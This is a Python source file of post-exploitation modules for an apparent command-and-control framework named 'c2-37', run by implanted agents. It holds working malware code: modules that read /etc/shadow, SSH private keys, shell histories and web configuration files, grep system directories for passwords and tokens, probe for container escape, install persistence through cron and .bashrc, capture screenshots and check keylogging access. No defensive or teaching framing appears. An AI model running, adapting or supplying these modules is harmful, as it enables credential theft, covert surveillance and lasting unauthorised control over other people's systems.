"""c2-37 post-exploitation modules.

Modules that can be loaded and executed by agents.
Each module returns structured JSON results.
"""
from __future__ import annotations


# Registry of available modules
MODULES = {}


def module(name: str):
    """Decorator to register a post-exploitation module."""
    def wrapper(func):
        MODULES[name] = {
            "name": name,
            "func": func,
            "description": func.__doc__ or "",
        }
        return func
    return wrapper


@module("enum_users")
def enum_users():
    """Enumerate local users and groups."""
    import subprocess, platform
    result = {"users": [], "groups": []}
    if platform.system() == "Windows":
        proc = subprocess.run("net user", shell=True, capture_output=True, text=True)
        result["raw"] = proc.stdout
    else:
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 7:
                        result["users"].append({
                            "name": parts[0], "uid": parts[2],
                            "gid": parts[3], "home": parts[5], "shell": parts[6]
                        })
        except Exception:
            pass
        try:
            with open("/etc/group") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 4:
                        result["groups"].append({
                            "name": parts[0], "gid": parts[2],
                            "members": parts[3].split(",") if parts[3] else []
                        })
        except Exception:
            pass
    return result


@module("enum_network")
def enum_network():
    """Enumerate network interfaces, routes, and connections."""
    import subprocess
    result = {}
    for name, cmd in [
        ("interfaces", "ip addr" if _is_linux() else "ipconfig /all"),
        ("routes", "ip route" if _is_linux() else "route print"),
        ("connections", "ss -tlnp" if _is_linux() else "netstat -ano"),
        ("arp", "arp -a" if _is_linux() else "arp -a"),
        ("dns", "cat /etc/resolv.conf" if _is_linux() else "ipconfig /displaydns"),
    ]:
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            result[name] = proc.stdout
        except Exception as e:
            result[name] = f"error: {e}"
    return result


@module("enum_processes")
def enum_processes():
    """List running processes."""
    import subprocess
    if _is_linux():
        proc = subprocess.run("ps auxf", shell=True, capture_output=True, text=True)
    else:
        proc = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True)
    return {"processes": proc.stdout}


@module("enum_suid")
def enum_suid():
    """Find SUID/SGID binaries (Linux only)."""
    import subprocess
    result = {"suid": [], "sgid": []}
    try:
        proc = subprocess.run(
            "find / -perm -4000 -type f 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=30
        )
        result["suid"] = [f for f in proc.stdout.strip().split("\n") if f]
    except Exception:
        pass
    try:
        proc = subprocess.run(
            "find / -perm -2000 -type f 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=30
        )
        result["sgid"] = [f for f in proc.stdout.strip().split("\n") if f]
    except Exception:
        pass
    return result


@module("enum_creds")
def enum_creds():
    """Search for credentials in common locations."""
    import os, subprocess
    findings = []

    # Common credential files
    cred_files = [
        "/etc/shadow", "/etc/sudoers",
        "~/.ssh/id_rsa", "~/.ssh/id_ed25519",
        "~/.bash_history", "~/.mysql_history",
        "~/.git-credentials", "~/.pgpass",
        "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/opt/wp-save.txt",
    ]
    for path in cred_files:
        path = os.path.expanduser(path)
        if os.path.exists(path):
            try:
                with open(path) as f:
                    content = f.read(2048)
                findings.append({"file": path, "readable": True, "preview": content[:500]})
            except PermissionError:
                findings.append({"file": path, "readable": False})

    # Grep for passwords in common config dirs
    try:
        proc = subprocess.run(
            r'grep -ril "password\|passwd\|secret\|api_key\|token" /etc/ /opt/ /var/www/ 2>/dev/null | head -20',
            shell=True, capture_output=True, text=True, timeout=15
        )
        if proc.stdout.strip():
            findings.append({"grep_matches": proc.stdout.strip().split("\n")})
    except Exception:
        pass

    return {"findings": findings}


@module("enum_docker")
def enum_docker():
    """Check for Docker/container escape opportunities."""
    import os, subprocess
    result = {
        "in_container": os.path.exists("/.dockerenv"),
        "docker_socket": os.path.exists("/var/run/docker.sock"),
    }
    if result["docker_socket"]:
        try:
            proc = subprocess.run(
                "docker ps 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5
            )
            result["containers"] = proc.stdout
        except Exception:
            pass
    # Check cgroups for container detection
    try:
        with open("/proc/1/cgroup") as f:
            cgroup = f.read()
            result["cgroup"] = cgroup[:500]
            if "docker" in cgroup or "lxc" in cgroup:
                result["in_container"] = True
    except Exception:
        pass
    return result


@module("persist_cron")
def persist_cron():
    """Install cron-based persistence (Linux)."""
    import subprocess, os
    me = os.path.abspath(__file__)
    cron_line = f"*/5 * * * * python3 {me} > /dev/null 2>&1"
    try:
        proc = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True)
        existing = proc.stdout if proc.returncode == 0 else ""
        if cron_line not in existing:
            new_cron = existing.rstrip() + "\n" + cron_line + "\n"
            proc = subprocess.run(
                f'echo "{new_cron}" | crontab -',
                shell=True, capture_output=True, text=True
            )
            return {"status": "installed", "cron": cron_line}
        return {"status": "already_installed"}
    except Exception as e:
        return {"error": str(e)}


@module("persist_bashrc")
def persist_bashrc():
    """Install .bashrc persistence (Linux)."""
    import os
    me = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"\n(nohup python3 {me} &>/dev/null &)\n"
    try:
        with open(bashrc, "r") as f:
            content = f.read()
        if me not in content:
            with open(bashrc, "a") as f:
                f.write(line)
            return {"status": "installed", "file": bashrc}
        return {"status": "already_installed"}
    except Exception as e:
        return {"error": str(e)}


@module("screenshot")
def screenshot():
    """Take a screenshot (requires display access)."""
    import subprocess, base64, tempfile, os
    path = tempfile.mktemp(suffix=".png")
    try:
        # Try various screenshot methods
        for cmd in [
            f"import -window root {path}",  # ImageMagick
            f"scrot {path}",  # scrot
            f"gnome-screenshot -f {path}",  # GNOME
            f"xfce4-screenshooter -f -s {path}",  # XFCE
        ]:
            proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            if os.path.exists(path):
                with open(path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                os.unlink(path)
                return {"status": "ok", "data": data, "format": "png"}
        return {"error": "no screenshot method available"}
    except Exception as e:
        return {"error": str(e)}


@module("keylog_check")
def keylog_check():
    """Check if keylogging is possible (input device access)."""
    import os
    devices = []
    try:
        for dev in os.listdir("/dev/input/"):
            path = f"/dev/input/{dev}"
            readable = os.access(path, os.R_OK)
            devices.append({"device": path, "readable": readable})
    except Exception:
        pass
    return {"input_devices": devices, "can_keylog": any(d["readable"] for d in devices)}


def list_modules() -> list[dict]:
    """List all available modules."""
    return [{"name": m["name"], "description": m["description"]} for m in MODULES.values()]


def run_module(name: str) -> dict:
    """Execute a module by name."""
    if name not in MODULES:
        return {"error": f"unknown module: {name}", "available": list(MODULES.keys())}
    try:
        return MODULES[name]["func"]()
    except Exception as e:
        return {"error": str(e)}


def _is_linux() -> bool:
    import platform
    return platform.system() == "Linux"
